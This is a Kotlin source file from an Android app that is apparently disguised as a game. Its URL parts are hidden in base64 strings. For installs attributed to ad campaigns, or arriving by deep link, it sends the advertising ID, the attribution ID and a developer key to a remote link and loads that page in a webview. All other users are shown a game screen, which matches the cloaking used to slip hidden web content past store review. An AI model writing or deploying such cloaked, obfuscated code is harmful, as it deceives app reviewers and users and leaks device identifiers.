package com.mraoj.jroek.DICTOR

import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.compose.runtime.Composable
import com.mraoj.jroek.DADA.KeyDEF
import com.mraoj.jroek.DADA.link
import com.mraoj.jroek.Gagan.Gane
import com.mraoj.jroek.MJ8
import com.mraoj.jroek.fincek
import com.onesignal.OneSignal
import kotlinx.coroutines.DelicateCoroutinesApi

var packadge = "Y29tLm1yYW9qLmpyb2Vr"
@DelicateCoroutinesApi

class PARY :AppCompatActivity(){
    var mj = MJ8()
    var staticKey: String? = null
    var teamName: String? = null
    var keyCompany: String? = null
    var sub2: String? = null
    var sub3: String? = null
    var sub4: String? = null
    var sub5: String? = null
    lateinit var campLucky: Array<String>

    fun ParseLine(parseline: String): String {
        campLucky = parseline.split("::").toTypedArray()

        try {
            staticKey = campLucky[0]
        } catch (e: Error) {
            staticKey = ""
        }
        try {
            teamName = campLucky[1]
        } catch (e: Error) {
            teamName = ""
        }
        try {
            keyCompany = campLucky[2]
        } catch (e: Error) {
            keyCompany = ""
        }
        try {
            sub2 = campLucky[3]
        } catch (e: Error) {
            sub2 = ""
        }
        try {
            sub3 = campLucky[4]
        } catch (e: Error) {
            sub3 = ""
        }
        try {
            sub4 = campLucky[5]
        } catch (e: Error) {
            sub4 = ""
        }
        try {
            sub5 = campLucky[6]
        } catch (e: Error) {
            sub5 = ""
        }

        OneSignal.sendTag(Dep.Muoq("c3ViX2FwcA=="), teamName)
        val AppsLineDecode =
            (staticKey + Dep.Muoq("P2J1bmRsZT0=") + Dep.Muoq(packadge) + Dep.Muoq("JmFkX2lkPQ==") +
                    ad_id + Dep.Muoq("JmFwcHNfaWQ9") +
                    apps_id + Dep.Muoq("JmRldl9rZXk9") +
                    Dep.Muoq(apps_key) + Dep.Muoq("JnN1YjY9") +
                    teamName + Dep.Muoq("JnN1Yjc9") + keyCompany +
                    Dep.Muoq("JnN1YjI9") + sub2 +
                    Dep.Muoq("JnN1YjM9") + sub3 +
                    Dep.Muoq("JnN1YjQ9") + sub4 +
                    Dep.Muoq("JnN1YjU9") + sub5)
        return AppsLineDecode
    }
@Composable
    fun ParseLineOrg() {
        val param = KeyDEF + Dep.Muoq("P2J1bmRsZT0=") + Dep.Muoq(packadge) +
                Dep.Muoq("JmFkX2lkPQ==") + ad_id + Dep.Muoq("JmFwcHNfaWQ9") +
                apps_id + Dep.Muoq("JmRldl9rZXk9") + Dep.Muoq(apps_key)
        val link = link + param
            mj.Venegred(url = link, OhBack = { wedmid ->
                if (wedmid?.canGoBack() == true) {
                    wedmid.goBack()
                }
            })
        Log.e("TAG","LinkOrg: $link")
    }



@Composable
    fun startTest(context: Context) {
        if (apps_static.equals(Dep.Muoq("Tm9uLW9yZ2FuaWM="))) {
            Log.e("TAG","AppsStat2: $apps_static")
            Log.e("TAG","AppsStatPAram: $paramAp")

            val link = link + paramAp
                mj.Venegred(url = link, OhBack = { wedmid ->
                    if (wedmid?.canGoBack() == true) {
                        wedmid.goBack()
                    }
                })
            Log.e("TAG", "APPS: $link")
        } else if (fincek != null) {
            val link = link + fincek
            Log.e("TAG","DEEPlink: $link")
                mj.Venegred(url = link, OhBack = { wedmid ->
                    if (wedmid?.canGoBack() == true) {
                        wedmid.goBack()
                    }
                })
            Log.e("TAG", "DEEPLINK: $link")
        } else {
            if (KeyDEF == Dep.Muoq("Tk8=")) {
                val intent = Intent(context, Gane::class.java)
                context.startActivity(intent)
                finish()
                Log.e("TAG", "KeyNO:Game")
            } else {
                ParseLineOrg()
            }
        }
    }




}